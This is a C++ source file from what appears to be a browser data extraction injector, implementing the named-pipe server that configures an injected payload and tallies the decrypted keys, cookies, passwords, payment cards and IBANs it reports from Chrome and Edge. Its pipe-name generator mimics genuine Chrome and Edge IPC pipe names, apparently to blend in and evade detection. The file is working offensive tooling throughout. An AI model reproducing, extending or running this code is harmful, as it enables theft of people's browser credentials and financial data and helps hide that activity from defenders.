// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "pipe_server.hpp"
#include "../core/console.hpp"
#include <iostream>
#include <vector>
#include <algorithm>
#include <sstream>
#include <regex>

namespace Injector {

    PipeServer::PipeServer(const std::wstring& browserType) 
        : m_pipeName(GenerateName(browserType)) {}

    void PipeServer::Create() {
        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                       PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                       1, 4096, 4096, 0, nullptr));
        
        if (!m_hPipe) {
            throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
        }
    }

    void PipeServer::WaitForClient() {
        if (!ConnectNamedPipe(m_hPipe.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED) {
            throw std::runtime_error("ConnectNamedPipe failed: " + std::to_string(GetLastError()));
        }
    }

    void PipeServer::SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output) {
        Write(verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
        Sleep(10);
        Write(fingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
        Sleep(10);
        Write(output.string());
        Sleep(10);
    }

    void PipeServer::Write(const std::string& msg) {
        DWORD written = 0;
        if (!WriteFile(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written, nullptr)) {
            throw std::runtime_error("WriteFile failed");
        }
    }

    void PipeServer::ProcessMessages(bool verbose) {
        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        std::string accumulated;
        char buffer[4096];
        bool completed = false;
        DWORD startTime = GetTickCount();

        Core::Console console(verbose);

        while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
            DWORD available = 0;
            if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                break;
            }

            if (available == 0) {
                Sleep(100);
                continue;
            }

            DWORD read = 0;
            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                continue;
            }

            accumulated.append(buffer, read);

            size_t start = 0;
            size_t nullPos;
            while ((nullPos = accumulated.find('\0', start)) != std::string::npos) {
                std::string msg = accumulated.substr(start, nullPos - start);
                start = nullPos + 1;

                if (msg == completionSignal) {
                    completed = true;
                    break;
                }

                // Handle structured messages from payload
                if (msg.rfind("DEBUG:", 0) == 0) {
                    console.Debug(msg.substr(6));
                }
                else if (msg.rfind("PROFILE:", 0) == 0) {
                    console.ProfileHeader(msg.substr(8));
                    m_stats.profiles++;
                }
                else if (msg.rfind("KEY:", 0) == 0) {
                    console.KeyDecrypted(msg.substr(4));
                }
                else if (msg.rfind("COOKIES:", 0) == 0) {
                    // Format: COOKIES:count:total
                    size_t sep = msg.find(':', 8);
                    if (sep != std::string::npos) {
                        int count = std::stoi(msg.substr(8, sep - 8));
                        int total = std::stoi(msg.substr(sep + 1));
                        m_stats.cookies += count;
                        m_stats.cookiesTotal += total;
                        console.ExtractionResult("Cookies", count, total);
                    }
                }
                else if (msg.rfind("PASSWORDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(10));
                    m_stats.passwords += count;
                    console.ExtractionResult("Passwords", count);
                }
                else if (msg.rfind("CARDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.cards += count;
                    console.ExtractionResult("Cards", count);
                }
                else if (msg.rfind("IBANS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.ibans += count;
                    console.ExtractionResult("IBANs", count);
                }
                else if (msg.rfind("DATA:", 0) == 0) {
                    std::string data = msg.substr(5);
                    size_t sep = data.find('|');
                    if (sep != std::string::npos) {
                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                    }
                }
                else if (msg.rfind("[-]", 0) == 0) {
                    console.Error(msg.substr(4));
                }
                else if (msg.rfind("[!]", 0) == 0) {
                    console.Warn(msg.substr(4));
                }
                else {
                    // Fallback for any unstructured messages (verbose only)
                    if (verbose && !msg.empty()) {
                        console.Debug(msg);
                    }
                }
            }
            accumulated.erase(0, start);
        }
    }

    std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        DWORD tick = GetTickCount();

        DWORD id1 = (pid ^ tick) & 0xFFFF;
        DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
        DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;

        std::wstring pipeName = L"\\\\.\\pipe\\";
        std::wstring lower = browserType;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);

        wchar_t buffer[128];

        if (lower == L"chrome") {
            static const wchar_t* patterns[] = {
                L"chrome.sync.%u.%u.%04X",
                L"chrome.nacl.%u_%04X",
                L"mojo.%u.%u.%04X.chrome"
            };
            swprintf_s(buffer, patterns[(id1 + id2) % 3], id1, id2, id3);
        } else if (lower == L"edge") {
            static const wchar_t* patterns[] = {
                L"msedge.sync.%u.%u",
                L"msedge.crashpad_%u_%04X",
                L"LOCAL\\msedge_%u"
            };
            swprintf_s(buffer, patterns[(id2 + id3) % 3], id1, id2);
        } else {
            swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
        }

        pipeName += buffer;
        return pipeName;
    }

}
